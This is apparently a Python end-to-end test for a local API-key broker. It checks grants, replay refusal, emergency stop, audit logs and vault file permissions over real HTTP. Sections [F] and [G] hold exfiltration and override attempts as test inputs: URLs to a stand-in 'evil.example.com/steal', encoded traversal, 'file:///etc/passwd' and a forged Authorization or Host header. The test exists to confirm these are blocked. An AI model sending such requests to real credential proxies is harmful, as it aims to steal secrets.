"""
End-to-end test over real HTTP, against a real broker process.

This is deliberately *not* the same as redteam.py. redteam exercises the
policy functions in-process; this one starts the actual server, talks to it
over a socket exactly the way an agent would, and checks that the secret never
crosses the boundary in either direction.

The upstream is a sniffer on loopback that records whether it ever saw the
key. If destination pinning is wrong, it sees it and we fail.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from digital_keys.broker import BrokerConfig  # noqa: E402
from digital_keys.records import Category, Provider, Record, SecretKind  # noqa: E402
from digital_keys.server import BrokerRuntime  # noqa: E402
from digital_keys.vault import Vault  # noqa: E402

SECRET = "sk-or-v1-LIVEKEY-SHOULD-NEVER-LEAK-0987654321"
PASS = "e2e passphrase long enough"

results: list[tuple[str, bool, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    results.append((name, ok, detail))
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f"  -- {detail}" if detail else ""))


class Sniffer(BaseHTTPRequestHandler):
    seen_auth = None
    saw_secret = False
    hits = 0

    def _do(self):
        Sniffer.hits += 1
        Sniffer.seen_auth = self.headers.get("Authorization")
        if Sniffer.seen_auth and SECRET in Sniffer.seen_auth:
            Sniffer.saw_secret = True
        body = json.dumps({"ok": True, "echo": self.headers.get("Authorization"),
                           "path": self.path}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = do_POST = do_DELETE = _do

    def log_message(self, *a):
        pass


def call(base, path, payload=None, method="GET"):
    url = base + path
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode())


def ctl(path, payload=None, method="GET"):
    """
    Privileged calls go over the control channel, not the agent listener.
    Agents cannot reach these routes at all.
    """
    from digital_keys import control

    return control.control_request(method, path, payload or {})


def main() -> int:
    print("=" * 74)
    print("dk live end-to-end (real HTTP, real server, real sockets)")
    print("=" * 74)

    # upstream
    import socket as _s
    sk = _s.socket()
    sk.bind(("127.0.0.1", 0))
    up_port = sk.getsockname()[1]
    sk.close()
    up = HTTPServer(("127.0.0.1", up_port), Sniffer)
    threading.Thread(target=up.serve_forever, daemon=True).start()

    tmp = tempfile.mkdtemp()
    vpath = os.path.join(tmp, "vault.json")
    v = Vault.create(vpath, PASS)
    with v.unlock(PASS) as h:
        rec = h.put(Record(id="", category=Category.LLM, kind=SecretKind.API_KEY,
                           label="OpenRouter live", secret=SECRET, provider_id="openrouter"))
        h.add_provider(Provider(
            id="openrouter", label="OpenRouter", category=Category.LLM,
            base_url=f"http://127.0.0.1:{up_port}/api/v1",
            auth_style="bearer", auth_prefix="Bearer ",
            allowed_methods=["GET", "POST"], allowed_path_prefixes=["/api/v1"]))
        rid = rec.id

    cfg = BrokerConfig(vault_path=vpath, unlock_fn=lambda: PASS, allow_private_for_custom=True)
    # Isolate the control socket so the test never touches a real broker's.
    os.environ["DIGITAL_KEYS_RUNTIME_DIR"] = os.path.join(tmp, "run")
    from digital_keys.server import BrokerRuntime

    runtime = BrokerRuntime(cfg, lambda: PASS, port=0).start()
    base = runtime.agent_url
    print(f"  broker   : {base}")
    print(f"  control  : {runtime.control.base_url}")
    print(f"  upstream : http://127.0.0.1:{up_port}")
    print(f"  record   : {rid[:8]}\n")

    try:
        print("[A] health and discovery")
        st, body = call(base, "/v1/health")
        check("health responds", st == 200 and body.get("ok") is True, str(st))
        st, body = call(base, "/v1/providers")
        check("providers listed", st == 200 and any(p["id"] == "openrouter" for p in body["providers"]))
        check("provider listing leaks no secret", SECRET not in json.dumps(body))

        print("\n[B] human grants an agent one request")
        st, g = ctl("/v1/grant", {
            "passphrase": PASS, "record_id": rid, "provider_id": "openrouter",
            "methods": ["POST"], "path_prefix": "/api/v1", "single_use": True}, "POST")
        check("grant issued", st == 200 and "token" in g, str(st))
        check("grant is single-use by default", g.get("single_use") is True)
        token = g["token"]

        print("\n[C] the approved request actually works")
        st, body = call(base, "/v1/request", {
            "token": token, "method": "POST", "path": "/api/v1/chat/completions",
            "body": {"model": "x", "messages": [{"role": "user", "content": "hi"}]}}, "POST")
        check("request proxied upstream", st == 200, str(st))
        check("upstream received the real key", Sniffer.saw_secret)
        check("upstream got the right path", body.get("path", "").startswith("/api/v1/chat/completions"),
              str(body.get("path")))
        check("agent response contains no secret", SECRET not in json.dumps(body))

        print("\n[D] the same token does not work twice")
        st, body = call(base, "/v1/request", {
            "token": token, "method": "POST", "path": "/api/v1/chat/completions", "body": {}}, "POST")
        check("replay refused", st == 403, str(st))

        print("\n[E] an agent cannot grant itself access")
        st, body = ctl("/v1/grant", {
            "passphrase": "guess", "record_id": rid, "provider_id": "openrouter"}, "POST")
        check("grant with wrong passphrase refused", st == 401, str(st))
        st, body = ctl("/v1/grant", {"record_id": rid, "provider_id": "openrouter"}, "POST")
        check("grant without passphrase refused", st == 401, str(st))

        print("\n[F] exfiltration attempts, each with a fresh grant")
        Sniffer.saw_secret = False
        attacks = [
            ("absolute url to attacker", {"method": "POST", "path": "http://evil.example.com/steal"}),
            ("protocol-relative", {"method": "POST", "path": "//evil.example.com/steal"}),
            ("userinfo confusion", {"method": "POST", "path": "https://openrouter.ai@evil.example.com/"}),
            ("encoded traversal", {"method": "POST", "path": "/api/v1/%2e%2e/%2e%2e/admin"}),
            ("out of scope path", {"method": "POST", "path": "/admin/drop-db"}),
            ("out of scope method", {"method": "DELETE", "path": "/api/v1/chat/completions"}),
            ("file scheme", {"method": "POST", "path": "file:///etc/passwd"}),
        ]
        for name, req in attacks:
            st, g = ctl("/v1/grant", {
                "passphrase": PASS, "record_id": rid, "provider_id": "openrouter",
                "methods": ["POST", "DELETE"], "path_prefix": "/", "single_use": True}, "POST")
            req = dict(req)
            req["token"] = g["token"]
            req.setdefault("body", {})
            st, body = call(base, "/v1/request", req, "POST")
            blocked = st in (400, 403)
            check(f"{name} refused", blocked, f"status={st}")

        check("no key leaked to any attacker path", not Sniffer.saw_secret)

        print("\n[G] hostile headers cannot override the injected auth")
        st, g = ctl("/v1/grant", {
            "passphrase": PASS, "record_id": rid, "provider_id": "openrouter",
            "methods": ["POST"], "path_prefix": "/api/v1"}, "POST")
        call(base, "/v1/request", {
            "token": g["token"], "method": "POST", "path": "/api/v1/chat/completions",
            "headers": {"Authorization": "Bearer STOLEN", "Host": "evil.example.com",
                        "X-Api-Key": "sk-attacker", "Cookie": "a=b"},
            "body": {}}, "POST")
        sent = Sniffer.seen_auth or ""
        check("agent Authorization ignored", "STOLEN" not in sent, sent[:50])
        check("real key still injected", SECRET in sent)

        print("\n[H] emergency stop")
        st, g = ctl("/v1/grant", {
            "passphrase": PASS, "record_id": rid, "provider_id": "openrouter",
            "methods": ["POST"], "path_prefix": "/api/v1"}, "POST")
        st, r = ctl("/v1/emergency-stop", {}, "POST")
        check("stop acknowledged", st == 200, str(r))
        st, body = call(base, "/v1/request", {
            "token": g["token"], "method": "POST", "path": "/api/v1/chat", "body": {}}, "POST")
        check("grant dead after stop", st == 403, str(st))

        print("\n[I] audit")
        st, a = ctl("/v1/audit?limit=500")
        blob = json.dumps(a)
        check("audit log has entries", len(a.get("audit", [])) > 5, f"{len(a.get('audit', []))} entries")
        check("audit contains no secret", SECRET not in blob)
        check("audit contains no passphrase", PASS not in blob)

        print("\n[J] file permissions on disk")
        mode = oct(os.stat(vpath).st_mode & 0o777)
        check("vault file is 0600", mode == "0o600", mode)
        raw = open(vpath).read()
        check("no plaintext anywhere in the file", SECRET not in raw and PASS not in raw)

    finally:
        runtime.stop()
        
        up.shutdown()

    passed = sum(1 for _, ok, _ in results if ok)
    total = len(results)
    print("\n" + "=" * 74)
    print(f"{passed}/{total} live checks passed")
    if passed != total:
        print("\nFAILURES:")
        for n, ok, d in results:
            if not ok:
                print(f"  - {n}  {d}")
    print("=" * 74)
    return 0 if passed == total else 1


if __name__ == "__main__":
    raise SystemExit(main())
